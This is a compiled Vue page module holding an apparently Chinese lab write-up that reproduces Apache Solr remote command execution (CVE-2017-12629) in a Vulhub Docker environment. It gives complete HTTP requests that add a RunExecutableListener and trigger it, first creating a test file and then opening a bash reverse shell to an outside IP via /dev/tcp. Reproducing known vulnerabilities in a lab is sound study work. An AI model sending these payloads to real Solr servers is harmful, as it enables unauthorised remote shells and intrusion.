import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as s,c as l,a as e,b as n,d as t,e as d}from"./app-58e4a7d6.js";const r={},u=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),c=e("p",null,"漏洞原理与分析可以参考：",-1),p={href:"https://www.exploit-db.com/exploits/43009/",target:"_blank",rel:"noopener noreferrer"},v={href:"https://paper.seebug.org/425/",target:"_blank",rel:"noopener noreferrer"},m={href:"https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-XXE",target:"_blank",rel:"noopener noreferrer"},b=d(`<p>本环境测试RCE漏洞。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub运行漏洞环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>命令执行成功后，需要等待一会，之后访问<code>http://your-ip:8983/</code>即可查看到Apache solr的管理页面，无需登录。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011112418.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /solr/demo/config HTTP/1.1
Host: your-ip
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 158

{&quot;add-listener&quot;:{&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;new_listener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/awesome_poc&quot;]}}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011114799.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后进行update操作，触发刚才添加的listener：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /solr/demo/update HTTP/1.1
Host: your-ip
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 15

[{&quot;id&quot;:&quot;test&quot;}]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011115847.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行<code>docker-compose exec solr bash</code>进入容器，可见<code>/tmp/awesome_poc</code>已成功创建：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011116817.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行反弹shell命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /solr/demo/config HTTP/1.1
Host: your-vps-ip:8983
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 192

{&quot;add-listener&quot;:{&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener_bash&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1&quot;]}}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后进行update操作，触发刚才添加的listener：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /solr/demo/update HTTP/1.1
Host: your-ip
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 15

[{&quot;id&quot;:&quot;test&quot;}]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>成功接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011120015.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,21);function g(h,q){const i=o("ExternalLinkIcon");return s(),l("div",null,[u,c,e("ul",null,[e("li",null,[e("a",p,[n("https://www.exploit-db.com/exploits/43009/"),t(i)])]),e("li",null,[e("a",v,[n("https://paper.seebug.org/425/"),t(i)])])]),e("p",null,[n("Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞："),e("a",m,[n("XML实体扩展漏洞（XXE）"),t(i)]),n("和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。")]),b])}const f=a(r,[["render",g],["__file","Apache Solr 远程命令执行漏洞 CVE-2017-12629.html.vue"]]);export{f as default};
